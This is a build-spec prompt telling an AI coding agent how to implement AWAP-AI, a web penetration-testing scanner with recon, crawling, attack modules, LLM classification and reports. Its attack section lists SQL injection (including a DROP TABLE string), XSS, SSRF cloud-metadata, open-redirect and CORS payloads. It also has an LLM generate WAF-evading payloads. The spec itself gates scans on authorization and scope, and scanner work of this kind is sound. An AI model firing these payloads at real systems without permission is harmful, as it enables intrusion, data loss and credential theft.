# AWAP-AI — Antigravity Implementation Fix Prompt
## Role & Mission

You are a senior full-stack security engineer. The AWAP-AI web application penetration testing platform has been built but **nothing is working functionally**. The dashboard and UI shell exist. Your job is to make the entire backend pipeline actually work — from target input to report generation. Do not rebuild the UI. Fix and wire up the working engine beneath it.

---

## CRITICAL CONTEXT — READ BEFORE WRITING A SINGLE LINE OF CODE

This is NOT a greenfield project. The UI/dashboard is already built. The problem is:

1. Scan jobs never actually run — they get queued but Celery workers either aren't running or tasks silently fail
2. The Recon Engine doesn't produce real output — DNS/subdomain calls return nothing or error silently
3. The Crawler Engine never launches Playwright — it either times out or the task is never consumed
4. Attack modules exist as empty stubs — no payloads are generated, no requests are sent
5. The AI Decision Engine has no connection to actual LLM APIs — responses are mocked or missing
6. The Report Generator produces empty files
7. WebSocket real-time updates never reach the frontend — the socket connection drops immediately

**You must fix all of the above. The UI calls APIs that must return real data. Wire them up.**

---

## ARCHITECTURE TO IMPLEMENT (DO NOT DEVIATE)

```
User → FastAPI REST → Scan Orchestrator (Celery) → Redis Task Bus
                                                    ↓
                         ┌──────────┬──────────────┬─────────────┐
                     Recon Engine  Crawler Engine  Attack Engine  AI Engine
                         ↓              ↓               ↓            ↓
                    PostgreSQL ← ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘
                         ↓
                   Report Generator → MinIO/local storage
                         ↓
                   WebSocket → Frontend Dashboard (already built)
```

---

## PHASE-BY-PHASE IMPLEMENTATION REQUIREMENTS

### PHASE 1 — Infrastructure & Celery Fix (Do This First, Nothing Works Without It)

**Problem:** Celery workers are not consuming tasks or crashing silently.

**Fix Requirements:**
- Verify `celery -A awap.core.celery_app worker --loglevel=info` starts without errors
- Every Celery task MUST have `bind=True`, explicit `max_retries=3`, and a `try/except` that logs failures to PostgreSQL scan log — silent failures are forbidden
- Add a `/api/health` endpoint that returns: Celery worker status (ping), Redis connectivity, PostgreSQL connectivity, and a timestamp. This endpoint must return `200 OK` with all subsystems green before any scan can be initiated
- Task state must be written to PostgreSQL at every state transition: `CREATED → RECON → CRAWL → ATTACK → ANALYSIS → REPORTING → COMPLETE` (or `FAILED` with error message)
- Add `flower` (Celery monitoring) to `docker-compose.yml` at port `5555` for debugging

**Celery task skeleton (enforce this pattern for ALL tasks):**
```python
@celery_app.task(bind=True, max_retries=3, name='awap.tasks.run_recon')
def run_recon_task(self, scan_id: str, target_id: str):
    try:
        update_scan_state(scan_id, ScanState.RECON)
        result = ReconEngine().run(target_id)
        store_recon_results(scan_id, result)
        run_crawl_task.delay(scan_id, target_id)
    except Exception as exc:
        log_scan_error(scan_id, str(exc))
        raise self.retry(exc=exc, countdown=30)
```

---

### PHASE 2 — Recon Engine (Real DNS/OSINT, Not Mocked)

**Problem:** The recon engine returns empty results or crashes on DNS calls.

**Implementation requirements — all of these must produce real output:**

**Subdomain Enumeration:**
```python
# Use dnspython for DNS brute-force — no subprocess calls to external binaries
import dns.resolver
import asyncio
import aiohttp

async def enumerate_subdomains(domain: str) -> list[str]:
    # 1. DNS brute-force from wordlist (use built-in wordlist of 5000 common subdomains)
    # 2. crt.sh API: GET https://crt.sh/?q=%.{domain}&output=json
    # 3. Merge, deduplicate, validate each resolves to an IP
    # Return: [{"subdomain": "api.example.com", "ip": "1.2.3.4", "source": "crt.sh"}]
```

**Technology Fingerprinting:**
```python
async def fingerprint_target(url: str) -> dict:
    # Send HEAD then GET request
    # Extract: Server header, X-Powered-By, Set-Cookie names, <meta generator>, 
    #          response body patterns for WordPress/Laravel/Django/Rails/Express
    # Return structured dict: {"server": "nginx/1.18", "framework": "Laravel", "cms": null, "waf": "Cloudflare"}
```

**WAF Detection:**
```python
# Send a known-bad payload like: ?q=<script>alert(1)</script>
# Check response for: Cloudflare Ray-ID header, "Access Denied" body patterns,
# Akamai reference, AWS WAF block page patterns, Imperva/Incapsula signatures
```

**Port Scanning (async, no nmap binary dependency):**
```python
async def scan_common_ports(host: str) -> list[int]:
    # Async TCP connect scan on ports: [80, 443, 8080, 8443, 3000, 5000, 8000, 8888, 9000]
    # asyncio.open_connection with 3s timeout
    # Return list of open ports
```

All recon results MUST be stored in PostgreSQL `recon_results` table with `scan_id` foreign key and a `source` field indicating how the data was discovered.

---

### PHASE 3 — Crawler Engine (Playwright Must Actually Launch)

**Problem:** Playwright never starts or times out immediately.

**Fix:**
```python
# docker-compose.yml must include:
# playwright install chromium --with-deps  # in Dockerfile RUN command
# The crawler service needs: RUN pip install playwright && playwright install chromium

async def crawl_target(start_url: str, scan_id: str, max_pages: int = 100):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
        )
        context = await browser.new_context(
            user_agent='Mozilla/5.0 (compatible; SecurityScanner/1.0)'
        )
        page = await context.new_page()
        
        # Intercept all requests to harvest endpoints
        page.on('request', lambda req: harvest_endpoint(req, scan_id))
        
        visited = set()
        queue = [start_url]
        
        while queue and len(visited) < max_pages:
            url = queue.pop(0)
            if url in visited:
                continue
            visited.add(url)
            
            try:
                await page.goto(url, timeout=15000, wait_until='networkidle')
                # Extract all links
                links = await page.eval_on_selector_all('a[href]', 
                    'els => els.map(e => e.href)')
                # Extract all forms
                forms = await page.eval_on_selector_all('form',
                    'els => els.map(e => ({action: e.action, method: e.method, inputs: [...e.elements].map(i => ({name: i.name, type: i.type}))}))')
                
                store_crawl_page(scan_id, url, links, forms)
                queue.extend([l for l in links if is_in_scope(l, start_url)])
            except Exception as e:
                log_crawl_error(scan_id, url, str(e))
                continue
        
        await browser.close()
```

**JavaScript Analysis (must run after crawl):**
```python
import re

JS_ENDPOINT_PATTERNS = [
    r'["\'](/api/[^"\']+)["\']',
    r'["\'](/v\d+/[^"\']+)["\']',
    r'axios\.(get|post|put|delete)\(["\']([^"\']+)["\']',
    r'fetch\(["\']([^"\']+)["\']',
    r'url:\s*["\']([^"\']+)["\']',
]

def extract_endpoints_from_js(js_content: str) -> list[str]:
    endpoints = []
    for pattern in JS_ENDPOINT_PATTERNS:
        matches = re.findall(pattern, js_content)
        endpoints.extend(matches if isinstance(matches[0], str) else [m[-1] for m in matches])
    return list(set(endpoints))
```

---

### PHASE 4 — Attack Engine (Payloads Must Actually Be Sent)

**Problem:** Attack modules are empty stubs. No HTTP requests are being made.

**This is the most critical section. Every module listed below must send real HTTP requests and analyze real responses.**

**Base Attack Module (all modules inherit this):**
```python
import httpx
import asyncio
from abc import ABC, abstractmethod

class AttackModule(ABC):
    
    def __init__(self, rate_limit: float = 10.0):
        self.client = httpx.AsyncClient(
            timeout=httpx.Timeout(10.0),
            follow_redirects=False,
            verify=False  # Pen testing context
        )
        self.delay = 1.0 / rate_limit
    
    async def send_payload(self, url: str, method: str, payload: str, 
                           param: str, param_type: str) -> httpx.Response:
        await asyncio.sleep(self.delay)
        
        if param_type == 'url_param':
            test_url = f"{url}?{param}={payload}"
            return await self.client.request(method, test_url)
        elif param_type == 'body':
            return await self.client.request(method, url, data={param: payload})
        elif param_type == 'header':
            return await self.client.request(method, url, headers={param: payload})
    
    @abstractmethod
    async def run(self, target_url: str, params: list[dict]) -> list[dict]:
        pass
```

**IMPLEMENT THESE MODULES — MINIMUM VIABLE SET FOR BUG BOUNTY USE:**

**1. SQLi Error-Based:**
```python
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg::syntaxerror",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "sqlite_error",
    "syntax error or access violation",
]

SQL_PAYLOADS = ["'", "''", "' OR '1'='1", "' OR 1=1--", '" OR "1"="1', "1' AND SLEEP(5)--", "1; DROP TABLE--"]

async def run(self, url, params):
    findings = []
    for param in params:
        for payload in SQL_PAYLOADS:
            resp = await self.send_payload(url, 'GET', payload, param['name'], param['type'])
            body_lower = resp.text.lower()
            for sig in SQL_ERROR_SIGNATURES:
                if sig in body_lower:
                    findings.append({
                        'vuln_class': 'SQL_INJECTION',
                        'url': url, 'param': param['name'],
                        'payload': payload, 'evidence': sig,
                        'severity': 'CRITICAL', 'cvss': 9.8
                    })
                    break
    return findings
```

**2. XSS Reflected:**
```python
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
]

# For each payload, check if EXACT payload appears in response body
# Use a unique canary: f"XSSCANARY{random_id}" wrapped in the payload
# If canary is reflected unencoded → confirmed XSS
```

**3. SSRF Detection:**
```python
SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',   # AWS metadata
    'http://metadata.google.internal/',            # GCP metadata  
    'http://127.0.0.1/',
    'http://localhost/',
    'http://0.0.0.0/',
]

SSRF_INDICATORS = [
    'ami-id', 'instance-id',           # AWS
    'computeMetadata',                  # GCP
    'root:', 'localhost',               # Generic
    'connection refused', 'timed out',  # Internal network response
]
```

**4. Open Redirect:**
```python
REDIRECT_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    '/\\evil.com',
    'https://evil.com%2F@target.com',
]

# Send payload, check if Location header points to evil.com
# Check response status 301/302/307/308 with attacker-controlled Location
```

**5. Security Headers Check (Info/Medium — very useful for bug bounty):**
```python
REQUIRED_HEADERS = {
    'Strict-Transport-Security': 'MISSING HSTS',
    'X-Frame-Options': 'MISSING Clickjacking Protection',
    'X-Content-Type-Options': 'MISSING MIME sniffing protection',
    'Content-Security-Policy': 'MISSING CSP',
    'Referrer-Policy': 'MISSING Referrer control',
}

# Simply GET the target URL and check which security headers are absent
```

**6. CORS Misconfiguration:**
```python
# Send request with: Origin: https://evil.com
# If response has: Access-Control-Allow-Origin: https://evil.com
# AND Access-Control-Allow-Credentials: true → CRITICAL finding
```

**7. JWT Attacks (if JWT tokens found in cookies/localStorage during crawl):**
```python
# Check for algorithm confusion: change alg to "none", strip signature
# Check for weak secret: try common secrets via brute-force
# Check kid injection: set kid to SQL or path traversal value
```

---

### PHASE 5 — Response Analysis Engine (Must Not Miss Signals)

```python
class ResponseAnalyzer:
    
    def __init__(self, baseline_response: httpx.Response):
        self.baseline_length = len(baseline_response.content)
        self.baseline_status = baseline_response.status_code
        self.baseline_time = baseline_response.elapsed.total_seconds()
    
    def analyze(self, response: httpx.Response, payload: str) -> list[str]:
        signals = []
        
        # 1. Status code change
        if response.status_code != self.baseline_status:
            signals.append(f'STATUS_CHANGE:{self.baseline_status}->{response.status_code}')
        
        # 2. Length delta > 20%
        length_delta = abs(len(response.content) - self.baseline_length)
        if length_delta / max(self.baseline_length, 1) > 0.2:
            signals.append(f'LENGTH_DELTA:{length_delta}')
        
        # 3. Timing anomaly > 4 seconds (time-based SQLi indicator)
        if response.elapsed.total_seconds() > 4.0:
            signals.append('TIMING_ANOMALY')
        
        # 4. Direct payload reflection
        if payload[:20] in response.text:
            signals.append('PAYLOAD_REFLECTED')
        
        # 5. Error patterns
        for sig in ALL_ERROR_SIGNATURES:
            if sig.lower() in response.text.lower():
                signals.append(f'ERROR_PATTERN:{sig}')
        
        return signals
```

---

### PHASE 6 — AI/LLM Integration (Must Actually Call the API)

**Problem:** LLM calls are mocked or not connected.

```python
import anthropic  # or openai

class AIDecisionEngine:
    
    def __init__(self, api_key: str, provider: str = 'anthropic'):
        if provider == 'anthropic':
            self.client = anthropic.Anthropic(api_key=api_key)
        
    async def classify_finding(self, finding: dict) -> dict:
        prompt = f"""You are a security vulnerability analyst. 
        
Analyze this finding and return a JSON object with these exact keys:
- vuln_class: string (SQL_INJECTION, XSS, SSRF, IDOR, etc.)
- severity: string (CRITICAL, HIGH, MEDIUM, LOW, INFO)
- cvss_score: number (0-10)
- cvss_vector: string (CVSS:3.1/AV:N/AC:L/...)
- cwe_id: string (CWE-XX)
- description: string (2-3 sentence technical description)
- remediation: string (specific fix guidance for the detected technology)
- false_positive_probability: number (0.0-1.0)

Finding data:
URL: {finding['url']}
Parameter: {finding['param']}
Payload used: {finding['payload']}
Evidence found: {finding['evidence']}
HTTP response snippet: {finding.get('response_snippet', '')[:500]}

Return ONLY valid JSON. No markdown, no explanation."""

        message = self.client.messages.create(
            model="claude-opus-4-6",
            max_tokens=1000,
            messages=[{"role": "user", "content": prompt}]
        )
        
        import json
        try:
            return json.loads(message.content[0].text)
        except:
            return finding  # Return original if parse fails
    
    async def generate_payloads(self, context: dict) -> list[str]:
        prompt = f"""You are a web application security expert. 
        
Generate 10 targeted attack payloads for this exact scenario:
- Injection point: {context['injection_point']}
- Reflected context: {context['reflection_context']}  
- Technology stack: {context['stack']}
- WAF detected: {context.get('waf', 'None')}
- Vulnerability class: {context['vuln_class']}
- Previously blocked patterns: {context.get('blocked', [])}

Return ONLY a JSON array of strings. Each string is one payload. No explanation."""

        message = self.client.messages.create(
            model="claude-opus-4-6",
            max_tokens=500,
            messages=[{"role": "user", "content": prompt}]
        )
        
        import json
        try:
            return json.loads(message.content[0].text)
        except:
            return []
```

---

### PHASE 7 — WebSocket Real-Time Updates (Must Reach Frontend)

**Problem:** WebSocket connection drops immediately or never sends events.

```python
# In FastAPI main.py
from fastapi import WebSocket, WebSocketDisconnect
import asyncio
import json

class ConnectionManager:
    def __init__(self):
        self.active_connections: dict[str, list[WebSocket]] = {}
    
    async def connect(self, websocket: WebSocket, scan_id: str):
        await websocket.accept()
        if scan_id not in self.active_connections:
            self.active_connections[scan_id] = []
        self.active_connections[scan_id].append(websocket)
    
    async def broadcast_to_scan(self, scan_id: str, message: dict):
        if scan_id in self.active_connections:
            dead = []
            for ws in self.active_connections[scan_id]:
                try:
                    await ws.send_json(message)
                except:
                    dead.append(ws)
            for ws in dead:
                self.active_connections[scan_id].remove(ws)

manager = ConnectionManager()

@app.websocket("/ws/scan/{scan_id}")
async def websocket_endpoint(websocket: WebSocket, scan_id: str):
    await manager.connect(websocket, scan_id)
    try:
        while True:
            await websocket.receive_text()  # Keep alive ping/pong
    except WebSocketDisconnect:
        manager.active_connections.get(scan_id, []).remove(websocket)

# Call this from Celery tasks via Redis pub/sub:
async def notify_finding(scan_id: str, finding: dict):
    await manager.broadcast_to_scan(scan_id, {
        "type": "FINDING",
        "data": finding,
        "timestamp": datetime.utcnow().isoformat()
    })

async def notify_state_change(scan_id: str, state: str, progress: int):
    await manager.broadcast_to_scan(scan_id, {
        "type": "STATE_CHANGE",
        "state": state,
        "progress": progress,
        "timestamp": datetime.utcnow().isoformat()
    })
```

**Note:** Celery tasks cannot directly call async FastAPI WebSocket methods. Use Redis pub/sub as the bridge: Celery task publishes to Redis channel → FastAPI async subscriber relays to WebSocket. Implement this bridge pattern.

---

### PHASE 8 — Report Generator (Must Produce Real Files)

```python
# Use reportlab for PDF (already in Python ecosystem)
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Table, TableStyle, Spacer
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib import colors
import json, csv
from io import StringIO

class ReportGenerator:
    
    def generate_pdf(self, scan_result: dict, output_path: str):
        doc = SimpleDocTemplate(output_path, pagesize=letter)
        styles = getSampleStyleSheet()
        story = []
        
        # Title
        story.append(Paragraph(f"Security Assessment Report", styles['Title']))
        story.append(Paragraph(f"Target: {scan_result['target']}", styles['Heading2']))
        story.append(Paragraph(f"Generated: {scan_result['generated_at']}", styles['Normal']))
        story.append(Spacer(1, 20))
        
        # Executive Summary
        story.append(Paragraph("Executive Summary", styles['Heading1']))
        findings = scan_result['findings']
        critical = len([f for f in findings if f['severity'] == 'CRITICAL'])
        high = len([f for f in findings if f['severity'] == 'HIGH'])
        story.append(Paragraph(
            f"Total findings: {len(findings)} | Critical: {critical} | High: {high}",
            styles['Normal']
        ))
        story.append(Spacer(1, 20))
        
        # Findings table
        story.append(Paragraph("Vulnerability Findings", styles['Heading1']))
        table_data = [['Severity', 'Vulnerability', 'URL', 'CVSS']]
        for f in sorted(findings, key=lambda x: x.get('cvss_score', 0), reverse=True):
            table_data.append([
                f.get('severity', 'INFO'),
                f.get('vuln_class', 'Unknown'),
                f.get('url', '')[:60],
                str(f.get('cvss_score', 0))
            ])
        
        table = Table(table_data, colWidths=[70, 150, 220, 50])
        table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.darkred),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTSIZE', (0, 0), (-1, 0), 12),
            ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.lightgrey, colors.white]),
            ('GRID', (0, 0), (-1, -1), 0.5, colors.black),
        ]))
        story.append(table)
        
        doc.build(story)
    
    def generate_json(self, scan_result: dict) -> str:
        return json.dumps(scan_result, indent=2, default=str)
    
    def generate_csv(self, scan_result: dict) -> str:
        output = StringIO()
        writer = csv.DictWriter(output, fieldnames=[
            'severity', 'vuln_class', 'url', 'param', 'payload', 'cvss_score', 'description'
        ])
        writer.writeheader()
        for finding in scan_result['findings']:
            writer.writerow({k: finding.get(k, '') for k in writer.fieldnames})
        return output.getvalue()
```

---

## DATABASE SCHEMA — ENFORCE EXACTLY

```sql
-- All tables must exist before any scan runs

CREATE TABLE targets (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    domain TEXT NOT NULL,
    scope_rules JSONB NOT NULL DEFAULT '[]',
    authorized BOOLEAN NOT NULL DEFAULT FALSE,
    authorized_at TIMESTAMPTZ,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE scans (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    target_id UUID REFERENCES targets(id),
    state TEXT NOT NULL DEFAULT 'CREATED',
    profile TEXT NOT NULL DEFAULT 'standard',
    progress INTEGER DEFAULT 0,
    error_message TEXT,
    started_at TIMESTAMPTZ,
    completed_at TIMESTAMPTZ,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE recon_results (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    scan_id UUID REFERENCES scans(id),
    type TEXT NOT NULL, -- 'subdomain', 'port', 'technology', 'waf'
    data JSONB NOT NULL,
    source TEXT NOT NULL,
    discovered_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE endpoints (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    scan_id UUID REFERENCES scans(id),
    url TEXT NOT NULL,
    method TEXT NOT NULL DEFAULT 'GET',
    params JSONB NOT NULL DEFAULT '[]',
    source TEXT NOT NULL, -- 'crawler', 'js_analysis', 'manual'
    discovered_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE findings (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    scan_id UUID REFERENCES scans(id),
    vuln_class TEXT NOT NULL,
    severity TEXT NOT NULL,
    cvss_score FLOAT,
    cvss_vector TEXT,
    cwe_id TEXT,
    url TEXT NOT NULL,
    param TEXT,
    payload TEXT,
    evidence TEXT,
    request_raw TEXT,
    response_raw TEXT,
    description TEXT,
    remediation TEXT,
    confidence FLOAT DEFAULT 0.8,
    false_positive BOOLEAN DEFAULT FALSE,
    confirmed BOOLEAN DEFAULT FALSE,
    discovered_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE scan_logs (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    scan_id UUID REFERENCES scans(id),
    level TEXT NOT NULL DEFAULT 'INFO',
    message TEXT NOT NULL,
    metadata JSONB,
    logged_at TIMESTAMPTZ DEFAULT NOW()
);
```

---

## API ENDPOINTS — ALL MUST RETURN REAL DATA

```
POST   /api/targets              → Create target (validate domain format)
GET    /api/targets              → List all targets with finding counts
POST   /api/scans                → Start scan (triggers Celery chain)
GET    /api/scans/{id}           → Scan status with progress
GET    /api/scans/{id}/findings  → All findings for scan (sorted by CVSS)
GET    /api/scans/{id}/logs      → Real-time log stream
POST   /api/scans/{id}/pause     → Pause running scan
POST   /api/scans/{id}/resume    → Resume paused scan
GET    /api/reports/{scan_id}/pdf    → Download PDF report
GET    /api/reports/{scan_id}/json   → Download JSON report
GET    /api/reports/{scan_id}/csv    → Download CSV report
GET    /api/health               → System health check
WS     /ws/scan/{id}            → WebSocket real-time updates
```

---

## DOCKER-COMPOSE REQUIREMENTS

```yaml
version: '3.8'
services:
  api:
    build: ./backend
    ports: ["8000:8000"]
    environment:
      - DATABASE_URL=postgresql://awap:password@postgres:5432/awap
      - REDIS_URL=redis://redis:6379/0
      - LLM_API_KEY=${LLM_API_KEY}
      - LLM_PROVIDER=anthropic
    depends_on: [postgres, redis]
    command: uvicorn awap.main:app --host 0.0.0.0 --port 8000 --reload
  
  worker:
    build: ./backend
    environment:
      - DATABASE_URL=postgresql://awap:password@postgres:5432/awap
      - REDIS_URL=redis://redis:6379/0
      - LLM_API_KEY=${LLM_API_KEY}
    depends_on: [postgres, redis]
    command: celery -A awap.core.celery_app worker --loglevel=info --concurrency=4
    # CRITICAL: Install Playwright here
    # Dockerfile must have: RUN pip install playwright && playwright install chromium --with-deps
  
  flower:
    build: ./backend
    ports: ["5555:5555"]
    depends_on: [redis]
    command: celery -A awap.core.celery_app flower --port=5555
  
  postgres:
    image: postgres:16
    environment:
      POSTGRES_DB: awap
      POSTGRES_USER: awap
      POSTGRES_PASSWORD: password
    volumes: ["postgres_data:/var/lib/postgresql/data"]
    ports: ["5432:5432"]
  
  redis:
    image: redis:7-alpine
    ports: ["6379:6379"]
  
  frontend:
    build: ./frontend
    ports: ["3000:3000"]
    depends_on: [api]

volumes:
  postgres_data:
```

---

## TESTING REQUIREMENTS (Must Pass Before Saying "It Works")

Test against DVWA (Damn Vulnerable Web Application) — include it in docker-compose:

```yaml
  dvwa:
    image: vulnerables/web-dvwa
    ports: ["4280:80"]
```

**Acceptance criteria — ALL must pass:**

1. `GET /api/health` returns `{"status": "ok", "celery": "connected", "postgres": "connected", "redis": "connected"}`
2. Create a target pointing to `http://dvwa:80`, start a scan, observe state change to `RECON` within 10 seconds
3. After recon completes, at least 1 subdomain or technology fingerprint is stored in `recon_results`
4. After crawl completes, at least 5 endpoints are stored in `endpoints` table
5. After attack phase, at least 1 finding is stored in `findings` table (DVWA has SQLi, XSS, command injection)
6. WebSocket client receives at least one `FINDING` event during the scan
7. `GET /api/reports/{scan_id}/pdf` returns a valid PDF file (non-zero bytes, opens correctly)
8. `GET /api/reports/{scan_id}/json` returns valid JSON with `findings` array

**Do not mark any phase complete until its acceptance criteria pass.**

---

## ABSOLUTE PROHIBITIONS

- **NO mock/fake data in any response** — if real data isn't available, return an empty array, never fabricated data
- **NO silent exception swallowing** — every `except` block must log to `scan_logs` table with full traceback
- **NO hardcoded API keys** — all secrets via environment variables
- **NO scanning outside the defined scope** — validate every URL against the target's scope rules before sending any request
- **NO subprocess calls to external security tools** (nmap, subfinder binaries) — use Python libraries only for portability
- **NO blocking calls in async functions** — use `asyncio.to_thread()` for any CPU-bound or blocking I/O operation
- **NO scan against targets without `authorized=True`** in the database record

---

## DEFINITION OF DONE

The tool is working when:
1. A user enters a target URL in the dashboard
2. Clicks "Start Scan"  
3. Watches the live scan monitor show real-time phase progression
4. Sees findings appear in the finding stream as they are discovered
5. After scan completes, downloads a PDF report with real vulnerability findings
6. All of this works against DVWA without manual intervention

That is the bar. Ship nothing less.
